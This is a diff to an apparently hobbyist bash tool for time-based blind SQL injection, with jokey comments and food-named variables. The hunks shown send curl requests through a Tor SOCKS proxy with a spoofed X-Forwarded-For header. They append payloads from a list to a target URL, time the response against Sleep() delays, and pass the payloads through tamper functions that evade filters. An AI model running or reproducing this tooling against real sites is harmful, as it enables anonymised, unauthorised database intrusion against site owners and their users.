@@ -5,7 +5,9 @@
 # Code version 2
 # I myself still wondering, why do i name this "risk".
 # Welp, sunshine and rainbow. For this file, me will make the variable sweer sweet. ig
-#chinesee, ah i forgot how to spell chinese. Ah whatever,correct me if the food's name wrong.
+#chinesee, ah i forgot how to spell chinese. Ah whatever,correct me if the food's name is wrong.
+#when yh
+
 echo ""
 echo -e "\e[0;33m[\e[0m!\e[0;33m]\e[0m You just toggle on risk mode.. So, as i promise, RISK MODE ACTIVE." 
 echo ""
@@ -62,8 +64,8 @@ time_audit_engine() {
     local stopwatch_seconds=$(curl --socks5-hostname 127.0.0.1:9050 -m 15 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$tangyuan$mooncake")
 
     if (( $(echo "$stopwatch_seconds > 4.0" | bc -l) )); then
-        local ba_bao_fan=$(echo "$mooncake" | sed 's/Sleep(5)/Sleep(2)/g' | sed 's/sleep(5)/sleep(2)/g')
-        local wash_hands_now=$(curl --socks5-hostname 127.0.0.1:9050 -m 10 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$tangyuan$ba_bao_fan")
+        local lapis_legit=$(echo "$mooncake" | sed 's/Sleep(5)/Sleep(2)/g' | sed 's/sleep(5)/sleep(2)/g')
+        local wash_hands_now=$(curl --socks5-hostname 127.0.0.1:9050 -m 10 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$tangyuan$lapis_legit")
 
         if (( $(echo "$wash_hands_now > 1.5" | bc -l) )) && (( $(echo "$wash_hands_now < 3.5" | bc -l) )); then
             echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
@@ -113,8 +115,8 @@ if [ "$risk_stage_success" = "false" ]; then
     while IFS= read -r sqli_payload || [ -n "$sqli_payload" ]; do
         [[ -z "$sqli_payload" || "$sqli_payload" =~ ^# ]] && continue
 
-        local tangyuan=$(echo "$sqli_payload" | awk -F' ' '{print $1}')
-        local mooncake=$(echo "$sqli_payload" | cut -d' ' -f2-)
+        tangyuan=$(echo "$sqli_payload" | awk -F' ' '{print $1}')
+        mooncake=$(echo "$sqli_payload" | cut -d' ' -f2-)
 
         lapis_satu=$(space2comment_engine "$mooncake") #Lol, i like lapis. Lapis is not that blu blu thing. Ah yk yk.
         lapis_dua=$(between_engine "$lapis_satu") #Im proud eating lapis.
